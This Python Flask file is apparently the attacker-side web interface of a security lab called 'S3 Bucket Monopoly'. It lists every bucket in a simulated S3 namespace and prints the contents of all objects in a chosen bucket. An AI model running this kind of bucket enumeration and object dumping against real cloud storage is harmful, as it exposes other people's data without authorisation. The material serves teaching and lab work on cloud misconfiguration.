"""S3 Bucket Monopoly — Attacker UI with bucket enumeration."""
import os, urllib.request, json
from flask import Flask, request, render_template_string

app = Flask(__name__)
S3 = os.environ.get("S3_URL", "http://s3-sim:5000")

HTML="""<!DOCTYPE html><html><head><title>S3 Bucket Explorer</title></head><body>
<h1>S3 Global Namespace Explorer</h1>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: List all buckets</strong> — Enumerate the global S3 namespace.
<form method=post action=/step1><button>List Buckets</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Explore a bucket</strong> — View objects and read files.
<form method=post action=/step2>
<label>Bucket name: <input name=bucket placeholder="demo-app-assets"></label>
<button>Explore</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — use Step 1 to discover buckets")

@app.route("/step1", methods=["POST"])
def step1():
    try:
        r = urllib.request.urlopen(f"{S3}/", timeout=5)
        buckets = json.loads(r.read().decode())
        return render_template_string(HTML, output=f"[+] Buckets in global namespace:\n{json.dumps(buckets, indent=2)}\n\n[→] Look for buckets that may contain interesting objects.")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step2", methods=["POST"])
def step2():
    bucket = request.form.get("bucket", "")
    if not bucket:
        return render_template_string(HTML, output="Error: bucket name required")
    try:
        r = urllib.request.urlopen(f"{S3}/buckets/{bucket}", timeout=5)
        info = json.loads(r.read().decode())
        output = f"Bucket: {bucket}\nOwner: {info.get('owner', 'unknown')}\nObjects: {info.get('objects', [])}\n"
        for obj in info.get("objects", []):
            try:
                r2 = urllib.request.urlopen(f"{S3}/buckets/{bucket}/{obj}", timeout=5)
                output += f"\n--- {obj} ---\n{r2.read().decode()}"
            except Exception as e:
                output += f"\n--- {obj} --- Error: {e}"
        return render_template_string(HTML, output=output)
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
